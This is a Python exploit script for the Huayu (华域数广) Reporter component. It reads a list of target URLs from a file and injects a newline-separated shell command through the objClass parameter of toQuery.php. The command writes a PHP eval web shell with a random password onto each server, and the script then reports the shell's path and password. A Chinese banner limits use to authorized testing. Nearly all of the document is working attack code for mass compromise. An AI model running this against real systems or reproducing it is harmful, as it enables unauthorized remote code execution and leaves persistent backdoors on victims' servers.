import requests
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_shell(url,poc):
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    proxies = {
        "http": "127.0.0.1:8082",
        "https": "127.0.0.1:8082"
    }
    try:
        r = requests.get(url+poc,headers=header,verify=False,proxy=proxies,timeout=5,)
        if r.status_code == 200:
            return True
        else:
            print("[-] %s 不存在漏洞" % url)
            return False
    except Exception as e:
        print("[*] %s 请求异常" % url)
        return False

def get_shell(url):
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    proxies = {
        "http": "127.0.0.1:8082",
        "https": "127.0.0.1:8082"
    }
    shellpath = "/view/Behavior/"+php_filename+".php"
    try:
        r = requests.get(url+shellpath,headers=header,proxy=proxies,verify=False,timeout=30)
        if r.status_code == 200 and "Junsheng" in str(r.text):
            print("[+]"+url+shellpath+" shellpass is :"+shellpass)
        else:
            print("[-] %s getshell failed" % url)
    except Exception as e:
        print(e)

def Login_report_RCE(filename):
    global shellpass
    global php_filename

    with open(filename, 'r', encoding="utf-8")as e:
        lines = e.readlines()
        for line in lines:
            shellpass = ''.join(random.sample(string.ascii_letters,1) + random.sample(string.ascii_letters + string.digits, 4))
            php_filename = ''.join(random.sample(string.ascii_letters,1) + random.sample(string.ascii_letters + string.digits, 7))
            poc = "/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27Junsheng%3C?php%20@eval%28$_POST%5B%27"+shellpass+"%27%5D%29;?%3E%27%3E/var/www/reporter/view/Behavior/"+php_filename+".php%0a"
            try:
                if check_shell(line,poc):
                    get_shell(line)
            except Exception as erro:
                print(erro)

def usage():
    print("")
    print("HuaYuReporterGetShell / 华域数广Reporter组件GetShell")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

def main():
    usage()
    filename = "url.txt"
    Login_report_RCE(filename)

main()
